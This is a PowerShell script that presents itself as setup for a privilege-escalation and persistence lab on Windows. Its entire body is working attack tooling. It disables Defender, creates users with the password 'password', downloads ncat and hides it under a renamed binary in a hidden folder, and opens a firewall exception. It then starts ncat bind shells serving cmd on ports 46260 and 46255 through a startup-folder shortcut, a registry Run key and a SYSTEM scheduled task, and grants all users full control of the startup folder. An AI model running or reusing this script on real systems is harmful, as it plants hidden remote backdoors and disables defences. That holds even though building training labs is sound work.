<# 

.SYNOPSIS
PRIVILEGE ESCALATION AND PERSISTENCE SCRIPT
AUTHOR: BRANDON WILBUR
DATE: 10/5/2020

Configures an environment for Privilege Escalation and Persistence Lab

.DESCRIPTION
This script will leave a system intentionally vulnerable to remote access and allow privilege escalation.
Persistence is also demonstrated alongside escalation methods. Each discrete item that this script
completes is broken down by section. After running this script, ncat backdoors will open on boot to
specified ports.

.NOTES
- Disable Windows Defender and add exclusion path for entire C drive
- Add multiple users, two standard and one administrator
- Download Ncat for the payload and hide it in a realistic-looking directory
- Add Firewall exception to allow payload to communicate
- Create batch file to call payload with arguments
- Misconfigure system startup folder to allow all users full access
- Add registry run keys to call payload on system startup
- Create scheduled task to call payload on system startup
- Restart newly vulnerable system
NCAT LISTENERS OPENED ON PORTS:
    - 46260
    - 46255

.EXAMPLE
.\persistence-and-privilege-escalation.ps1

#>

### DISABLE DEFENDER ###

Set-MpPreference -DisableRealtimeMonitoring $True
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value '1' `
    -PropertyType DWORD -Force
Add-MpPreference -ExclusionPath 'C:\'


### ADD USERS ###

$Password = ConvertTo-SecureString 'password' -AsPlainText -Force

# At the moment, all users share the same password. This can be easily changed
# by modifying the $Password variable below.

New-LocalUser 'ariel' -FullName 'Ariel' -Password $Password
Add-LocalGroupMember -Group 'Administrators' -Member 'ariel'

New-LocalUser 'bob' -FullName 'Bob' -Password $Password
Add-LocalGroupMember -Group 'Users' -Member 'bob'

New-LocalUser 'alex' -FullName 'Alex' -Password $Password
Add-LocalGroupMember -Group 'Users' -Member 'alex'


### DOWNLOAD AND STORE PAYLOAD ###

# Download ncat portable, place it within folder and remove original download

Invoke-WebRequest -Uri 'http://nmap.org/dist/ncat-portable-5.59BETA1.zip' -OutFile 'C:\Program Files\nc.zip' `
    -UseBasicParsing

Expand-Archive -LiteralPath 'C:\Program Files\nc.zip' -DestinationPath 'C:\Program Files\Windows'

Move-Item -Path 'C:\Program Files\Windows\ncat-portable-5.59BETA1\ncat.exe' -Destination `
    'C:\Program Files\Windows\n.exe'

Remove-Item 'C:\Program Files\nc.zip'

# Remove suspicious directory and all files within it

Get-ChildItem 'C:\Program Files\Windows\ncat-portable-5.59BETA1' -Recurse | Remove-Item
Remove-Item 'C:\Program Files\Windows\ncat-portable-5.59BETA1'

# Hide the bad directory from being viewed in the GUI

attrib +h 'C:\Program Files\Windows'


### FIREWALL RULE TO ALLOW PAYLOAD TO COMMUNICATE ###

# Add Firewall Rule Exception for program to communicate out

New-NetFirewallRule -DisplayName 'Allow n' -Program 'C:\Program Files\Windows\n.exe' -Action Allow


### CREATE BATCH SCRIPT TO RUN PAYLOAD ###

# Write a .bat script calling the ncat backdoor. This is required for startup folder execution.

New-Item -Path 'C:\Program Files\Windows\' -Name 'startup.bat' -ItemType 'file' -Value `
    "start /b /d 'C:\Program Files\Windows\' n.exe -l -p 46260 -e cmd"


### STARTUP FOLDER PERSISTENCE & ESCALATION ###

# Grant full privileges to all users to the system startup folder. 

$Acl = Get-Acl 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'

$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule('Users', `
        'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')

$Acl.SetAccessRule($AccessRule)

Set-Acl 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' $Acl


# Create a link in the startup menu to a .bat file that runs the malicious program.

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.lnk')
$Shortcut.TargetPath = 'C:\Program Files\Windows\startup.bat'
$Shortcut.WindowStyle = 7
$Shortcut.Save()


### REGISTRY PERSISTENCE & ESCALATION ###

# Add malicious executable to registry for startup.
# This registry key will spawn an instance of the payload under the privileges of the logged in user.

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '(Default)' -Value `
    "powershell Start-Process -FilePath 'C:\Program Files\Windows\n.exe' 
    -ArgumentList '-l', '-p 46255', '-e cmd' -WindowStyle Hidden"


### SCHEDULED TASK PERSISTENCE & ESCALATION ###

# Create a scheduled task to run batch file calling the payload.

schtasks /Create /RU SYSTEM /SC ONSTART /TN STARTUP /TR 'C:\Program Files\Windows\startup.bat'


### RESTART SYSTEM ###

Restart-Computer